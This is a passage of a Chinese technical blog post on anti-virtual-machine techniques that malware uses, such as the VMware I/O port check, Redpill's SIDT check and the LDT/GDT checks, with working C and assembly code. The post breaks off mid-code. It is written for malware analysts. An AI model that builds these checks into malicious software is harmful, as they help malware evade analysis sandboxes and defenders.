    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在当今信息安全领域，特别是恶意软件分析中，经常需要利用到虚拟机技术，以提高病毒分析过程的安全性以及硬件资源的节约性，因此它在恶意软件领域中是应用越来越来广泛。这里我们所谓的虚拟机（Virtual Machine）是指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。通过虚拟机软件（比如VMware，Virtual PC ,VirtualBox），你可以在一台物理计算机上模拟出一台或多台虚拟的计算机，这些虚拟机完全就像真正的计算机那样进行工作，例如你可以安装操作系统、安装应用程序、访问网络资源等等。攻击者为了提高恶意程序的隐蔽性以及破坏真实主机的成功率，他们都在恶意程序中加入检测虚拟机的代码，以判断程序所处的运行环境。当发现程序处于虚拟机（特别是蜜罐系统）中时，它就会改变操作行为或者中断执行，以此提高反病毒人员分析恶意软件行为的难度。本文主要针对基于Intel CPU的虚拟环境VMware中的Windows XP SP3系统进行检测分析，并列举出当前常见的几种虚拟机检测方法。&lt;/p&gt;
&lt;h3 id=&quot;方法一：通过执行特权指令来检测虚拟机&quot;&gt;&lt;a href=&quot;#方法一：通过执行特权指令来检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法一：通过执行特权指令来检测虚拟机&quot;&gt;&lt;/a&gt;方法一：通过执行特权指令来检测虚拟机&lt;/h3&gt;&lt;p&gt;Vmware为真主机与虚拟机之间提供了相互沟通的通讯机制，它使用“IN”指令来读取特定端口的数据以进行两机通讯，但由于IN指令属于特权指令，在处于保护模式下的真机上执行此指令时，除非权限允许，否则将会触发类型为“EXCEPTION_PRIV_INSTRUCTION”的异常，而在虚拟机中并不会发生异常，在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”；而当功能号为0x14时，可用于获取VMware内存大小，当大于0时则说明处于虚拟机中。VMDetect正是利用前一种方法来检测VMware的存在，其检测代码分析如下：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bool IsInsideVMWare()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bool rc = true;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  __try&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __asm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      push   edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      push   ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      push   ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    eax, &#39;VMXh&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    ebx, 0  // 将ebx设置为非幻数’VMXH’的其它值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    ecx, 10 // 指定功能号，用于获取VMWare版本，当它为0x14时用于获取VMware内存大小&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    edx, &#39;VX&#39; // 端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      in     eax, dx // 从端口dx读取VMware版本到eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      		     //若上面指定功能号为0x14时，可通过判断eax中的值是否大于0，若是则说明处于虚拟机中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      cmp    ebx, &#39;VMXh&#39; // 判断ebx中是否包含VMware版本’VMXh’，若是则在虚拟机中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      setz   [rc] // 设置返回值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      pop    ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      pop    ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      pop    edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  __except(EXCEPTION_EXECUTE_HANDLER)  //如果未处于VMware中，则触发此异常&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rc = false;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return rc;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                 图1&lt;br&gt;&lt;/center&gt;

&lt;p&gt;如图1所示，VMDetect成功检测出VMWare的存在。&lt;/p&gt;
&lt;h3 id=&quot;方法二：利用IDT基址检测虚拟机&quot;&gt;&lt;a href=&quot;#方法二：利用IDT基址检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法二：利用IDT基址检测虚拟机&quot;&gt;&lt;/a&gt;方法二：利用IDT基址检测虚拟机&lt;/h3&gt;&lt;p&gt;利用IDT基址检测虚拟机的方法是一种通用方式，对VMware和Virtual PC均适用。中断描述符表IDT（Interrupt Descriptor Table）用于查找处理中断时所用的软件函数，它是一个由256项组成的数据，其中每一中断对应一项函数。为了读取IDT基址，我们需要通过SIDT指令来读取IDTR（中断描述符表寄存器，用于IDT在内存中的基址），SIDT指令是以如下格式来存储IDTR的内容：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WORD IDTLimit;    &lt;span class=&quot;comment&quot;&gt;// IDT的大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WORD LowIDTbase;  &lt;span class=&quot;comment&quot;&gt;// IDT的低位地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WORD HiIDTbase; &lt;span class=&quot;comment&quot;&gt;// IDT的高位地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; IDTINFO;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于只存在一个IDTR，但又存在两个操作系统，即虚拟机系统和真主机系统。为了防止发生冲突，VMM（虚拟机监控器）必须更改虚拟机中的IDT地址，利用真主机与虚拟机环境中执行sidt指令的差异即可用于检测虚拟机是否存在。著名的“红丸”（redpill）正是利用此原理来检测VMware的。Redpill作者在VMware上发现虚拟机系统上的IDT地址通常位于0xFFXXXXXX，而Virtual PC通常位于0xE8XXXXXX，而在真实主机上正如图2所示都位于0x80xxxxxx。Redpill仅仅是通过判断执行SIDT指令后返回的第一字节是否大于0xD0，若是则说明它处于虚拟机，否则处于真实主机中。Redpill的源码甚是精简，源码分析如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; m[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;], rpill[] = &lt;span class=&quot;string&quot;&gt;&quot;\x0f\x01\x0d\x00\x00\x00\x00\xc3&quot;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//相当于SIDT[adrr],其中addr用于保存IDT地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *((unsigned*)&amp;amp;rpill[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) = (unsigned)m;  &lt;span class=&quot;comment&quot;&gt;//将sidt[addr]中的addr设为m的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ((void(*)())&amp;amp;rpill)();  &lt;span class=&quot;comment&quot;&gt;//执行SIDT指令，并将读取后IDT地址保存在数组m中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;idt base: %#x\n&quot;&lt;/span&gt;, *((unsigned*)&amp;amp;m[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]));  &lt;span class=&quot;comment&quot;&gt;//由于前2字节为IDT大小，因此从m[2]开始即为IDT地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (m[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]&amp;gt;&lt;span class=&quot;number&quot;&gt;0xd0&lt;/span&gt;) &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;Inside Matrix!\n&quot;&lt;/span&gt;, m[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]); &lt;span class=&quot;comment&quot;&gt;//当IDT基址大于0xd0xxxxxx时则说明程序处于VMware中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;Not in Matrix.\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图2所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                                     图2&lt;br&gt;&lt;/center&gt;                                     

&lt;p&gt;利用此IDT检测的方法存在一个缺陷，由于IDT的值只针对处于正在运行的处理器而言，在单CPU中它是个常量，但当它处于多CPU时就可能会受到影响了，因为每个CPU都有其自己的IDT，这样问题就自然而然的产生了。针对此问题，Offensive Computing组织成员提出了两种应对方法，其中一种方法就是利用Redpill反复地在系统上循环执行任务，以此构造出一张当前系统的IDT值变化统计图，但这会增加CPU负担；另一种方法就是windows API函数SetThreadAffinityMask()将线程限制在单处理器上执行，当执行此测试时只能准确地将线程执行环境限制在本地处理器，而对于将线程限制在VM处理器上就可能行不通了，因为VM是计划在各处理器上运行的，VM线程在不同的处理器上执行时，IDT值将会发生变化，因此此方法也是很少被使用的。为此，有人提出了使用LDT的检测方法，它在具有多个CPU的环境下检测虚拟机明显优于IDT检测方法，该方法具体内容参见下节内容。&lt;/p&gt;
&lt;h3 id=&quot;方法三：利用LDT和GDT的检测方法&quot;&gt;&lt;a href=&quot;#方法三：利用LDT和GDT的检测方法&quot; class=&quot;headerlink&quot; title=&quot;方法三：利用LDT和GDT的检测方法&quot;&gt;&lt;/a&gt;方法三：利用LDT和GDT的检测方法&lt;/h3&gt;&lt;p&gt;在 《Intel® 64 and IA-32  Architecture Software Developer’s Manual Volume 3A: System Programming Guide》第二章的Vol.3 2-5 一页（我的Intel开发手册是2008版的）中对于LDT和GDT的描述如下（以下内容为个人翻译）：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在保护模式下，所有的内存访问都要通过全局描述符表（GDT）或者本地描述符表（LDT）才能进行。这些表包含有段描述符的调用入口。各个段描述符都包含有各段的基址，访问权限，类型和使用信息，而且每个段描述符都拥有一个与之相匹配的段选择子，各个段选择子都为软件程序提供一个GDT或LDT索引（与之相关联的段描述符偏移量），一个全局/本地标志（决定段选择子是指向GDT还是LDT），以及访问权限信息。&lt;br&gt;若想访问段中的某一字节，必须同时提供一个段选择子和一个偏移量。段选择子为段提供可访问的段描述符地址（在GDT 或者LDT 中）。通过段描述符，处理器从中获取段在线性地址空间里的基址，而偏移量用于确定字节地址相对基址的位置。假定处理器在当前权限级别（CPL）可访问这个段，那么通过这种机制就可以访问在GDT 或LDT 中的各种有效代码、数据或者堆栈段，这里的CPL是指当前可执行代码段的保护级别。&lt;br&gt;……&lt;br&gt;GDT的线性基址被保存在GDT寄存器（GDTR）中，而LDT的线性基址被保存在LDT寄存器（LDTR）中。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于虚拟机与真实主机中的GDT和LDT并不能相同，这与使用IDT的检测方法一样，因此虚拟机必须为它们提供一个“复制体”。关于GDT和LDT的基址可通过SGDT和SLDT指令获取。虚拟机检测工具Scoopy suite的作者Tobias Klein经测试发现，当LDT基址位于0x0000（只有两字节）时为真实主机，否则为虚拟机，而当GDT基址位于0xFFXXXXXX时说明处于虚拟机中，否则为真实主机。具体实现代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;LDTDetect&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; ldt_addr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; ldtr[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _asm sldt ldtr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ldt_addr = *((unsigned short *)&amp;amp;ldtr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;LDT BaseAddr: 0x%x\n&quot;&lt;/span&gt;, ldt_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ldt_addr == &lt;span class=&quot;number&quot;&gt;0x0000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Native OS\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Inside VMware\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;GDTDetect&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gdt_addr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; gdtr[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _asm sgdt gdtr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    gdt_addr = *((unsigned int *)&amp;amp;gdtr[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;GDT BaseAddr:0x%x\n&quot;&lt;/span&gt;, gdt_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((gdt_addr &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Inside VMware\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span 